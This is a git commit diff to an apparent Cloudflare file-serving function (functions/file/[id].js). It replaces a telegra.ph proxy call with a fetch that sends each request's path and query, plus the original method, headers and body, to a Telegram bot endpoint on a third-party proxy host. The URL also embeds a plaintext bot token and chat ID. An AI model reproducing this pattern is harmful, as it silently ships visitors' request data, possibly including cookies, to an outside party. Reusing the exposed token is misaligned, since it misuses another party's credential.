094b622ae1a74dd2e747ac7f9bf975713a1d42de
q916442926 <127854704+q916442926@users.noreply.github.com>
2023-12-26 23:19:14 +0800

    Update [id].js

--- functions/file/[id].js
+++ functions/file/[id].js
@@ -8,16 +8,16 @@ export async function onRequest(context) {  // Contents of context object
      data, // arbitrary space for passing data between middlewares 
      } = context;
      context.request
-    
      const url = new URL(request.url);
+    
      // const zlj = await env.img_url.getWithMetadata('5f954516455ba3352f8d1.jpg');//JSON.stringify(
      // if (zlj.value != ""){
      //     const urlhz = zlj.value
      // }else{
      //     const urlhz = url.search
      // };
-        const response = fetch('https://tgapi.888687.xyz/bot6264060435:AAGCYdpe408dMB3Pz9Rry7ypaECxhY9cVHE/sendMessage?chat_id=5781139687&text=' + url.search, { 
-     // const response = fetch('https://telegra.ph/' + url.pathname + urlhz, {   
+      // const response = fetch('https://telegra.ph/' + url.pathname + urlhz, {  
+        const response = fetch('https://tgapi.888687.xyz/bot6264060435:AAGCYdpe408dMB3Pz9Rry7ypaECxhY9cVHE/sendMessage?chat_id=5781139687&text='+url.pathname+ "000" + url.search, { 
          method: request.method,
          headers: request.headers,
          body: request.body,
